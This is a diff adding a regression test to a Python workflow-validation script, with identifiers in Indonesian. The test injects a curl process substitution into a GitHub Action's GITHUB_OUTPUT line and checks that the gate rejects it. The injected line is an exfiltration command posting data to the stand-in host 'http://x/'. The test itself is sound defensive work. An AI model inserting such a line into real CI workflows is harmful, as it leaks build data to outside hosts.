@@ -41573,6 +41573,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("sdiff singkatan --wid=abc kini diselesaikan dan ditolak (Audit 2900)", rc == 0)
         shutil.rmtree(sub1962, ignore_errors=True)
+        sub1963 = klon(tmp, "sub1963")
+        berkas_aksi1963 = os.path.join(
+            sub1963, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1963, encoding="utf-8") as f:
+            isi_aksi1963 = f.read()
+        baris_aksi1963 = [b for b in isi_aksi1963.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1963 = isi_aksi1963.replace(
+                baris_aksi1963,
+                baris_aksi1963.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --tls-max 1.4 -d @- http://x/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1963 != isi_aksi1963, \
+            "suntikan aksi1963 tidak menembak"
+        with open(berkas_aksi1963, "w", encoding="utf-8") as f:
+            f.write(isi_baru1963)
+        rc, out = jalan(sub1963,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl --tls-max di luar enum kini ditolak (Audit 2901)", rc == 0)
+        shutil.rmtree(sub1963, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
